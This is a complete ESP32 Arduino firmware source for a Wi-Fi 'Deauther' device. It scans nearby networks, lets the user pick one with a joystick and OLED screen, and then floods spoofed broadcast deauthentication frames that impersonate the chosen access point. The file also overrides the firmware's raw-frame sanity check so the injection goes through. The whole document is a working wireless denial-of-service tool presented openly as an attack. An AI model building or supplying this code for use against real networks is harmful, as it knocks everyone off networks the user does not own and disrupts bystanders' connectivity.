#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <Wire.h>
#include <U8g2lib.h>
#include <vector>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  return 0;
}

#define OLED_SDA_PIN  5
#define OLED_SCL_PIN  6
#define JOY_VRX_PIN   4
#define JOY_VRY_PIN   3
#define JOY_SW_PIN    2

U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, OLED_SCL_PIN, OLED_SDA_PIN);

struct NetworkInfo {
  String ssid;
  uint8_t bssid[6];
  int32_t channel;
  int32_t rssi;
};

struct DeauthFrame {
     uint8_t frame_control[2];
     uint8_t duration[2];
     uint8_t addr1[6];
     uint8_t addr2[6];
     uint8_t addr3[6];
     uint8_t sequence_control[2];
     uint8_t reason_code[2];
} __attribute__((packed));

uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

enum Mode {
  MODE_SCANNING,
  MODE_ATTACKING
};
Mode currentMode = MODE_SCANNING;

std::vector<NetworkInfo> scannedNetworks;
int selectedNetworkIndex = 0;
int displayNetworkStartIndex = 0;
NetworkInfo selectedAP;

int lastJoyY = 2048;
bool joyMoved = false;
unsigned long lastJoyMoveTime = 0;
const int JOY_DEADZONE = 500;
const unsigned long JOY_REPEAT_DELAY = 150;

bool buttonPressed = false;
bool lastButtonState = HIGH;

// New globals for debounce
unsigned long buttonDownTime = 0;
bool buttonIsDebouncing = false;
const unsigned long DEBOUNCE_DELAY_MS = 10;

void setupWifi();
void startScan();
void displayScanResults();
void handleJoystickInput();
void startAttackMode();
void stopAttackMode();
void sendBroadcastDeauthPacket();
void printMac(const uint8_t* mac, char* buffer);
void updateDisplay();

void setup() {
  setCpuFrequencyMhz(80);
  Serial.begin(115200);
  delay(1000);
  printf("ESP32 Deauther Starting...\n");

  Wire.begin(OLED_SDA_PIN, OLED_SCL_PIN);
  u8g2.begin();
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tf);
  u8g2.setCursor(0, 10);
  u8g2.print("Initializing...");
  u8g2.sendBuffer();
  printf("OLED Initialized.\n");

  pinMode(JOY_VRX_PIN, INPUT);
  pinMode(JOY_VRY_PIN, INPUT);
  pinMode(JOY_SW_PIN, INPUT_PULLUP);
  printf("Joystick Pins Configured.\n");

  setupWifi();

  startScan();

  currentMode = MODE_SCANNING;
  updateDisplay();
  printf("Setup Complete. Scanning Mode Active.\n");
}

void loop() {
  handleJoystickInput();

  if (currentMode == MODE_ATTACKING) {
      sendBroadcastDeauthPacket();
      delay(5);
  } else {
      delay(20);
  }
}

void setupWifi() {
  printf("Setting up WiFi...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  printf("WiFi Setup Done.\n");
}

void startScan() {
  printf("Starting Network Scan...\n");
  u8g2.clearBuffer();
  u8g2.setCursor(0, 10);
  u8g2.print("Scanning...");
  u8g2.sendBuffer();

  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  delay(100);

  int n = WiFi.scanNetworks();
  printf("Scan Found %d Networks.\n", n);

  scannedNetworks.clear();
  if (n > 0) {
    for (int i = 0; i < n; ++i) {
      NetworkInfo net;
      net.ssid = WiFi.SSID(i);
      memcpy(net.bssid, WiFi.BSSID(i), 6);
      net.channel = WiFi.channel(i);
      net.rssi = WiFi.RSSI(i);
      scannedNetworks.push_back(net);
    }
  }
  WiFi.scanDelete();

  selectedNetworkIndex = 0;
  displayNetworkStartIndex = 0;
}

const int MAX_DISPLAY_LINES = 6;

void updateDisplay() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tf);

  if (currentMode == MODE_SCANNING) {
    displayScanResults();
  } else if (currentMode == MODE_ATTACKING) {
    displayAttackStatus();
  }

  u8g2.sendBuffer();
}

void displayScanResults() {

  if (scannedNetworks.empty()) {
    u8g2.setCursor(0, 15);
    u8g2.print("No networks found.");
    u8g2.setCursor(0, 30);
    u8g2.print("Press button to rescan.");
  } else {
    int linesToDraw = min((int)scannedNetworks.size() - displayNetworkStartIndex, MAX_DISPLAY_LINES);
    for (int i = 0; i < linesToDraw; ++i) {
      int networkIdx = displayNetworkStartIndex + i;
      int yPos = 10 + (i * 10);

      if (networkIdx == selectedNetworkIndex) {
        u8g2.drawBox(0, yPos - 8, u8g2.getDisplayWidth(), 10);
        u8g2.setDrawColor(0);
      } else {
         u8g2.setDrawColor(1);
      }

      char lineBuffer[50];
      snprintf(lineBuffer, sizeof(lineBuffer), "%s Ch:%d",
               scannedNetworks[networkIdx].ssid.substring(0, 15).c_str(),
               scannedNetworks[networkIdx].channel);
      u8g2.setCursor(2, yPos);
      u8g2.print(lineBuffer);

      u8g2.setDrawColor(1);
    }
    if (displayNetworkStartIndex > 0) {
        u8g2.drawTriangle(u8g2.getDisplayWidth() - 6, 3, u8g2.getDisplayWidth() - 9, 7, u8g2.getDisplayWidth() - 3, 7);
    }
     if (displayNetworkStartIndex + MAX_DISPLAY_LINES < scannedNetworks.size()) {
        u8g2.drawTriangle(u8g2.getDisplayWidth() - 6, u8g2.getDisplayHeight() - 2, u8g2.getDisplayWidth() - 3, u8g2.getDisplayHeight() - 6, u8g2.getDisplayWidth() - 9, u8g2.getDisplayHeight() - 6);
    }
  }
}

void displayAttackStatus() {
  u8g2.setCursor(0, 10);
  u8g2.print("Attacking AP:");

  char bssidStr[18];
  printMac(selectedAP.bssid, bssidStr);

  u8g2.setCursor(0, 22);
  u8g2.print(selectedAP.ssid.substring(0, 20));

  u8g2.setCursor(0, 34);
  u8g2.print(bssidStr);

  u8g2.setCursor(0, 46);
  u8g2.print("Ch:");
  u8g2.print(selectedAP.channel);
  u8g2.print(" | Broadcast");

  u8g2.setCursor(0, 58);
  u8g2.print("Press Btn to Stop");
}

void printMac(const uint8_t* mac, char* buffer) {
  sprintf(buffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void handleJoystickInput() {
    // Button Debounce Logic
    bool currentPhysicalButtonState = digitalRead(JOY_SW_PIN);

    // Edge detection: HIGH to LOW (button pressed due to INPUT_PULLUP)
    if (currentPhysicalButtonState == LOW && lastButtonState == HIGH) {
        buttonDownTime = millis();
        buttonIsDebouncing = true;
        // printf("Button edge detected, starting debounce.\n"); // Optional: for debugging
    }

    if (buttonIsDebouncing) {
        // Check if debounce delay has passed
        if ((millis() - buttonDownTime) > DEBOUNCE_DELAY_MS) {
            // Delay has passed. If button is still LOW, it's a confirmed press.
            if (currentPhysicalButtonState == LOW) {
                buttonPressed = true; // Set the flag for the main logic to consume
                printf("Button Pressed (Debounced)\n");
            }
            // Whether it was a confirmed press or a bounce (released during delay),
            // stop debouncing for this event.
            buttonIsDebouncing = false;
        }
    }
    lastButtonState = currentPhysicalButtonState; // Update for next cycle's edge detection

    int joyY = analogRead(JOY_VRY_PIN);
    bool movedUp = false;
    bool movedDown = false;

    if (joyY < (2048 - JOY_DEADZONE)) {
        movedUp = true;
        lastJoyY = joyY;
    } else if (joyY > (2048 + JOY_DEADZONE)) {
        movedDown = true;
        lastJoyY = joyY;
    } else {
        if (joyMoved) {
            lastJoyY = 2048;
            joyMoved = false;
        }
    }

    bool allowMove = false;
    if ((movedUp || movedDown) && !joyMoved) {
        allowMove = true;
        joyMoved = true;
        lastJoyMoveTime = millis();
    } else if (joyMoved && (millis() - lastJoyMoveTime > JOY_REPEAT_DELAY)) {
        allowMove = true;
        lastJoyMoveTime = millis();
    }

    if (currentMode == MODE_SCANNING) {
        if (allowMove && !scannedNetworks.empty()) {
            if (movedUp) {
                selectedNetworkIndex--;
                if (selectedNetworkIndex < 0) selectedNetworkIndex = scannedNetworks.size() - 1;
                printf("Joystick Up - Selected Index: %d\n", selectedNetworkIndex);
            } else if (movedDown) {
                selectedNetworkIndex++;
                if (selectedNetworkIndex >= scannedNetworks.size()) selectedNetworkIndex = 0;
                printf("Joystick Down - Selected Index: %d\n", selectedNetworkIndex);
            }

            if (selectedNetworkIndex < displayNetworkStartIndex) {
                displayNetworkStartIndex = selectedNetworkIndex;
            } else if (selectedNetworkIndex >= displayNetworkStartIndex + MAX_DISPLAY_LINES) {
                displayNetworkStartIndex = selectedNetworkIndex - MAX_DISPLAY_LINES + 1;
            }
            updateDisplay();
        }

        if (buttonPressed) {
            if (!scannedNetworks.empty() && selectedNetworkIndex >= 0 && selectedNetworkIndex < scannedNetworks.size()) {
                selectedAP = scannedNetworks[selectedNetworkIndex];
                printf("Selected AP: %s (Ch: %d)\n", selectedAP.ssid.c_str(), selectedAP.channel);
                startAttackMode();
            } else if (scannedNetworks.empty()) {
                printf("Button pressed, no networks. Rescanning...\n");
                startScan();
                updateDisplay();
            } else {
                printf("Button pressed, but selection index (%d) is invalid or list empty.\n", selectedNetworkIndex);
            }
            buttonPressed = false;
        }

    } else if (currentMode == MODE_ATTACKING) {
        if (buttonPressed) {
            printf("Button pressed in Attack Mode. Stopping attack...\n");
            stopAttackMode();
            buttonPressed = false;
        }
    }
}

void startAttackMode() {
  if (scannedNetworks.empty()) return;

  currentMode = MODE_ATTACKING;
  printf("Entering Broadcast Attack Mode for %s on channel %d\n", selectedAP.ssid.c_str(), selectedAP.channel);

  updateDisplay();

  printf("Setting channel to %d...", selectedAP.channel);
  esp_err_t ch_err = esp_wifi_set_channel(selectedAP.channel, WIFI_SECOND_CHAN_NONE);
  if (ch_err != ESP_OK) {
    printf(" FAILED: %s\n", esp_err_to_name(ch_err));
    stopAttackMode();
    return;
  }
  printf(" OK.\n");
  delay(50);
}

void stopAttackMode() {
   printf("Stopping Attack Mode.\n");

   currentMode = MODE_SCANNING;
   updateDisplay();
   printf("Switched back to Scanning Mode.\n");
}

void sendBroadcastDeauthPacket() {
  if (currentMode != MODE_ATTACKING) return;

  DeauthFrame deauth_frame;

  deauth_frame.frame_control[0] = 0xC0;
  deauth_frame.frame_control[1] = 0x00;

  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;

  memcpy(deauth_frame.addr1, broadcast_mac, 6);
  memcpy(deauth_frame.addr2, selectedAP.bssid, 6);
  memcpy(deauth_frame.addr3, selectedAP.bssid, 6);

  deauth_frame.reason_code[0] = 0x01;
  deauth_frame.reason_code[1] = 0x00;

  deauth_frame.sequence_control[0] = 0x00;
  deauth_frame.sequence_control[1] = 0x00;

  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t *)&deauth_frame, sizeof(deauth_frame), false);
}